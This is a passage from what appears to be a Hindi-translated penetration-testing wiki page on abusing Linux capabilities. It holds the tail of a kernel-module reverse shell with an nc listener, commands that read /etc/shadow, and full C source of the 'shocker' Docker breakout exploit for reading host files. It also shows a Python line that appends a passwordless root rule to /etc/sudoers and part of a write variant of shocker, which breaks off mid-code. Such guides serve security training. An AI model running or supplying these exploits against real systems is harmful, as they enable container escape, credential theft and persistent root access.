return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile рдореЗрдВ рд╣рд░ рд╢рдмреНрдж рдХреЗ рдкрд╣рд▓реЗ рд░рд┐рдХреНрдд рдЪрд░рд┐рддреНрд░ **рдЯреИрдм рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рди рдХрд┐ рд╕реНрдкреЗрд╕реЗрд╕**!
{% endhint %}

рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `make` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
рдЕрдВрдд рдореЗрдВ, рдПрдХ рд╢реИрд▓ рдореЗрдВ `nc` рд╢реБрд░реВ рдХрд░реЗрдВ рдФрд░ рджреВрд╕рд░реЗ рд╢реИрд▓ рд╕реЗ **рдореЙрдбреНрдпреВрд▓ рд▓реЛрдб** рдХрд░реЗрдВ рдФрд░ рдЖрдк nc рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╢реИрд▓ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдВрдЧреЗ:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдХреЛрдб "Abusing SYS\_MODULE Capability" рдХреЗ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛ рд╕реЗ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) рдореЗрдВ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ, рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкрдврд╝рдиреЗ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рджреЗрддрд╛ рд╣реИред рдЬрдмрдХрд┐ рдЗрд╕реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдпрд╛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ `open_by_handle_at(2)` рдХреЛ рдЖрд╣реНрд╡рд╛рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рднреА рджреЗрддрд╛ рд╣реИред рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд╛рд╕ `CAP_DAC_READ_SEARCH` рдХреНрд╖рдорддрд╛ рд╣реЛрдиреЗ рдкрд░ рд╡рд╣ `open_by_handle_at(2)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреА рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЙрдирдХреЗ рдорд╛рдЙрдВрдЯ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдмрд╛рд╣рд░ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рднреАред `open_by_handle_at(2)` рдореЗрдВ рдкрд╛рд░рд┐рдд рд╣реИрдВрдбрд▓ рдХреЛ `name_to_handle_at(2)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╣реИрдВрдбрд▓ рдЧреЛрдкрдиреАрдп рдФрд░ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХреЗ рдпреЛрдЧреНрдп рдЬрд╛рдирдХрд╛рд░реА, рдЬреИрд╕реЗ рдЗрдиреЛрдб рдирдВрдмрд░, рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред рдпрд╣ Docker рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ Sebastian Krahmer рджреНрд╡рд╛рд░рд╛ [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) рдЕрдкрд╢рдмреНрдж рдХреЗ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдореБрджреНрджрд╛ рд╕рд╛рдмрд┐рдд рд╣реБрдЖред\
**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЬрд╛рдВрдЪ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкрдврд╝рдиреЗ / рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдЕрдиреБрдорддрд┐ рдЬрд╛рдВрдЪ рдХреЛ рдЫреЛрдбрд╝рдХрд░ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдмрд╛рдЗрдирд░реА рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝ рд╕рдХреЗрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЬреИрд╕реЗ tar рдХреЗ рдкрд╛рд╕ рдЗрд╕ рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ рддреЛ рдпрд╣ shadow рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝ рд╕рдХреЗрдЧрд╛:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**рдмрд╛рдЗрдирд░реА 2 рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдорд╛рди рд▓реЗрдВ рдХрд┐ **`python`** рдмрд╛рдЗрдирд░реА рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИред рд░реВрдЯ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕реВрдЪреА рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
print(open("/etc/shadow", "r").read())
```
**рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдЙрджрд╛рд╣рд░рдг (Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ)**

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
рдкрд┐рдЫрд▓реЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **DAC\_READ\_SEARCH** рдХреНрд╖рдорддрд╛ рд╕рдХреНрд╖рдо рд╣реИред рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдХрдВрдЯреЗрдирд░ **рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдбреАрдмрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

рдЖрдк рдпрд╣рд╛рдВ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрддреНрдкрд╛рджрди рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ: [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) рд▓реЗрдХрд┐рди рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рдХрд╣реЗрдВ рддреЛ **CAP\_DAC\_READ\_SEARCH** рд╣рдореЗрдВ рдЕрдиреБрдорддрд┐ рдХреЗ рдмрд┐рдирд╛ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реА рд╣реИ, рдмрд▓реНрдХрд┐ рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ _**open\_by\_handle\_at(2)**_ рдФрд░ **рд╣рдорд╛рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЦреЛрд▓реА рдЧрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА рдХрд┐рд╕реА рднреА рдЬрд╛рдВрдЪ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдореВрд▓ рдЙрддреНрдкрд╛рджрди рдЬреЛ рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рд╕реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдпрд╣рд╛рдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдХ **рд╕рдВрд╢реЛрдзрд┐рдд рд╕рдВрд╕реНрдХрд░рдг рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рджрд░реНрдЬ рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдбрдВрдк рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
рдореБрдЭреЗ рдХрд┐рд╕реА рдЪреАрдЬрд╝ рдХреЗ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдвреВрдВрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ рд╣реЛрд╕реНрдЯ рдкрд░ рдорд╛рдЙрдВрдЯ рдХреА рдЧрдИ рд╣реЛред рдореВрд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдореЗрдВ рдлрд╝рд╛рдЗрд▓ /.dockerinit рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдЗрд╕ рд╕рдВрд╢реЛрдзрд┐рдд рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ /etc/hostname рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рд╢рд╛рдпрдж рдЖрдкрдХреЛ рдПрдХ рдЕрд▓рдЧ рдлрд╝рд╛рдЗрд▓ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рд╣реЛрд╕реНрдЯ рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдвреВрдВрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╕ рдорд╛рдЙрдВрдЯ рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛рдПрдВ:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдХреЛрдб "Abusing DAC\_READ\_SEARCH Capability" рдХреЗ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛ рд╕реЗ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

тАЛ

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЗрд╡реЗрдВрдЯ рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рд╣рд░ рд╡рд┐рд╖рдп рдореЗрдВ рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рдиреЗ рдХрд╛ рд╕рдордп рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХреЛ рдЫреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдкрд░ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред**

рдмрд╣реБрдд рд╕рд╛рд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬрд┐рди рдкрд░ рдЖрдк **рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ,** [**рдпрд╣рд╛рдВ рд╕реЗ рдЖрдк рд╡рд┐рдЪрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ vim рдХреЗ рдкрд╛рд╕ рдЗрд╕ рдХреНрд╖рдорддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк _passwd_, _sudoers_ рдпрд╛ _shadow_ рдЬреИрд╕реА рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**рджреВрд╕рд░рд╛ рдЙрджрд╛рд╣рд░рдг рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде**

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ **`python`** рдмрд╛рдЗрдирд░реА рдХреЛ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред рдЖрдк рдкрд╛рдпрдерди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**рдЙрджрд╛рд╣рд░рдг рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде + CAP_DAC_READ_SEARCH (Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ)**

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣реЛрд╕реНрдЯ рдХреА [**DAC\_READ\_SEARCH рдХреНрд╖рдорддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдирд┐рдпрдорд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ**](linux-capabilities.md#cap\_dac\_read\_search) рдХреЗ рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдХреЛ рдкрдврд╝реЗрдВ рдФрд░ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ **рдХрдВрдкрд╛рдЗрд▓** рдХрд░реЗрдВред
рдлрд┐рд░, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢реЙрдХрд░ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдВрд╕реНрдХрд░рдг **рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ**, рдЬреЛ рдЖрдкрдХреЛ рд╣реЛрд╕реНрдЯ рдХреА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ **рдЕрдирд┐рдпрдорд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
